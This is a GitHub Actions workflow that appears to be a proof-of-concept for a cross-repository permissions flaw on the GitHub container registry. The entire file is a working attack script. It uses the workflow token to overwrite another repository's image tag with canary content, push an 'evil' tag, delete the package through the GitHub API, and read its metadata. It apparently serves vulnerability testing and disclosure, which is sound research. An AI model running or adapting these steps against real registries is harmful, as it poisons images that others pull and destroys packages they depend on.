name: pkgattack
on: workflow_dispatch
jobs:
  a:
    runs-on: ubuntu-latest
    permissions:
      packages: write
      contents: read
    steps:
      - name: repo A token attacking a package linked to repo B
        env:
          TK: ${{ github.token }}
        run: |
          set +e
          echo "=== identity / repo of this token: $GITHUB_REPOSITORY ==="
          echo "$TK" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
          echo "=== 1. OVERWRITE the tag owned by the other repo (supply-chain poisoning) ==="
          printf 'FROM scratch\nCOPY hello.txt /\n' > Dockerfile
          echo "PKGCANARY-POISONED-BY-REPO-A" > hello.txt
          docker build -q -t ghcr.io/h1-scyoon/pkgcanary:v1 .
          docker push ghcr.io/h1-scyoon/pkgcanary:v1 2>&1 | tail -5
          echo "=== 2. push a NEW tag into the other repo's package ==="
          docker tag ghcr.io/h1-scyoon/pkgcanary:v1 ghcr.io/h1-scyoon/pkgcanary:evil
          docker push ghcr.io/h1-scyoon/pkgcanary:evil 2>&1 | tail -5
          echo "=== 3. DELETE the package via API ==="
          curl -s -o /tmp/d.out -w "  DELETE /user/packages/container/pkgcanary -> %{http_code}\n" -X DELETE -H "Authorization: token $TK" https://api.github.com/user/packages/container/pkgcanary
          head -c 200 /tmp/d.out; echo
          echo "=== 4. read package metadata ==="
          curl -s -o /tmp/g.out -w "  GET /users/h1-scyoon/packages/container/pkgcanary -> %{http_code}\n" -H "Authorization: token $TK" https://api.github.com/users/h1-scyoon/packages/container/pkgcanary
          head -c 200 /tmp/g.out; echo
